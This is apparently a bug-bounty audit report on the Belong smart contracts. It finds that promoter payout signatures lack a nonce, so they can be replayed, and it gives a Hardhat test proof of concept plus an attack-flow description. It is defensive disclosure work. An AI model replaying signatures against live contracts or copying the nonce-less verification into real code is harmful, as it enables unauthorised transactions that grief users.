# 57283 sc medium unauthorised promoter payouts due to signature replay attack&#x20;

**Submitted on Oct 24th 2025 at 23:17:18 UTC by @Oxv1bh4 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57283
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

The `distributePromoterPayments` function allows promoters to claim rewards using off-chain signatures. Since signatures do not include a nonce or unique identifier, the same signature can be **reused (replayed)**, enabling **unauthorized actions** by the attackers, such as repeated claims or claiming rewards earlier than intended.

### Vulnerability Details

The vulnerability exists because the signature verification in `distributePromoterPayments` does not include a nonce or any unique identifier to prevent reuse. Promoters can claim rewards fully or partially, with partial claims requiring multiple function calls. Since the signed payload is not unique, an attacker who obtains a valid signature can replay it, causing the function to execute the same reward claim multiple times or earlier than intended. This allows the attacker to trigger unauthorized actions by executing claims outside the intended schedule, due to insufficient replay protection in the signature validation logic.

```solidity
// @audit -> Missing nonce (Unique Identifier).
function checkPromoterPaymentDistribution(address signer, PromoterInfo memory promoterInfo) external view {
        require(
            signer.isValidSignatureNow(
                keccak256(
                    abi.encodePacked(promoterInfo.promoter, promoterInfo.venue, promoterInfo.amountInUSD, block.chainid)
                ),
                promoterInfo.signature
            ),
            InvalidSignature()
        );
    }
```

### Impact Details

The attacker cannot profit from this issue, but they can perform unauthorized actions by repeatedly calling distributePromoterPayments. This could potentially cause disruption to the promoter, especially if the payment is in LONG, since the associated swap might occur at an unfavorable time. Therefore, Medium severity is appropriate, as this constitutes griefing.

### References

<https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol?utm\\_source=immunefi#L204-L215>

## Proof of Concept

<details>

<summary>Test case modification demonstrating the replay</summary>

Update the test case `distributePromoterPayments() (partial amount)` in the `test/v2/platform/belong-check-in.test.ts` as follows:

```ts
it.only('distributePromoterPayments() (partial amount)', async () => {
      const {
        belongCheckIn,
        helper,
        escrow,
        promoterToken,
        referral,
        signer,
        treasury,
        referralCode,
        USDC,
        ENA,
        USDC_whale,
        ENA_whale,
      } = await loadFixture(fixture);

      const uri = 'uriuri';
      const venueAmount = await u(100, USDC);
      const venue = USDC_whale.address;
      const venueMessage = ethers.utils.solidityKeccak256(
        ['address', 'bytes32', 'string', 'uint256'],
        [venue, referralCode, uri, chainId],
      );
      const venueSignature = EthCrypto.sign(signer.privateKey, venueMessage);

      let venueInfo: VenueInfoStruct = {
        rules: { paymentType: 3, bountyType: 3, longPaymentType: 0 } as VenueRulesStruct,
        venue,
        amount: venueAmount,
        referralCode,
        uri,
        signature: venueSignature,
      };

      const paymentToAffiliate = await helper.calculateRate(fees.affiliatePercentage, venueAmount);
      const willBeTaken = paymentToAffiliate.add(convenienceFeeAmount.add(venueAmount));
      await USDC.connect(USDC_whale).approve(belongCheckIn.address, willBeTaken);
      await belongCheckIn.connect(USDC_whale).venueDeposit(venueInfo);

      const customerAmount = await u(5, USDC);
      const customerMessage = ethers.utils.solidityKeccak256(
        ['bool', 'uint128', 'uint24', 'address', 'address', 'address', 'uint256', 'uint256'],
        [
          true, // paymentInUSDC
          await u(1, USDC), // visitBountyAmount (uint24, adjust to uint256 if needed)
          1000, // spendBountyPercentage (uint24, adjust to uint256 if needed)
          ENA_whale.address, // customer
          USDC_whale.address, // venueToPayFor
          referral.address, // promoter
          customerAmount, // amount
          chainId, // block.chainid
        ],
      );
      const customerSignature = EthCrypto.sign(signer.privateKey, customerMessage);
      const customerInfo: CustomerInfoStruct = {
        paymentInUSDC: true,
        visitBountyAmount: await u(1, USDC),
        spendBountyPercentage: 1000,
        customer: ENA_whale.address,
        venueToPayFor: USDC_whale.address,
        promoter: referral.address,
        amount: customerAmount,
        signature: customerSignature,
      };

      await USDC.connect(USDC_whale).transfer(ENA_whale.address, customerAmount);
      await USDC.connect(ENA_whale).approve(belongCheckIn.address, customerAmount);

      await belongCheckIn.connect(ENA_whale).payToVenue(customerInfo);

      const promoterBalance_promoterToken_before = await promoterToken.balanceOf(
        referral.address,
        await helper.getVenueId(USDC_whale.address),
      );

      const promoterMessage = ethers.utils.solidityKeccak256(
        ['address', 'address', 'uint256', 'uint256'],
        [
          referral.address, // promoter
          USDC_whale.address, // venue
          promoterBalance_promoterToken_before.div(2), // amountInUSD
          chainId, // block.chainid
        ],
      );
      const promoterSignature = EthCrypto.sign(signer.privateKey, promoterMessage);
      const promoterInfo: PromoterInfoStruct = {
        paymentInUSDC: true,
        promoter: referral.address,
        venue: USDC_whale.address,
        amountInUSD: promoterBalance_promoterToken_before.div(2),
        signature: promoterSignature,
      };

      let toPromoter = promoterBalance_promoterToken_before.div(2);
      const platformFees = await helper.calculateRate(1000, toPromoter);
      toPromoter = toPromoter.sub(platformFees);

      // Calling two times with the same signature
      await belongCheckIn.connect(referral).distributePromoterPayments(promoterInfo);
      await belongCheckIn.connect(referral).distributePromoterPayments(promoterInfo);
    });
```

Run the command `npm run test`

</details>

## Attack flow

{% stepper %}
{% step %}

### Step

The promoter submits a partial reward claim requesting payment in LONG.
{% endstep %}

{% step %}

### Step

An attacker replays the promoter’s valid signature and calls `distributePromoterPayments` at an unfavorable market moment, forcing the contract to swap USDC→LONG.
{% endstep %}

{% step %}

### Step

The replayed, unauthorized transaction causes the promoter to receive less LONG due to the poor swap rate, producing a griefing impact.
{% endstep %}
{% endstepper %}
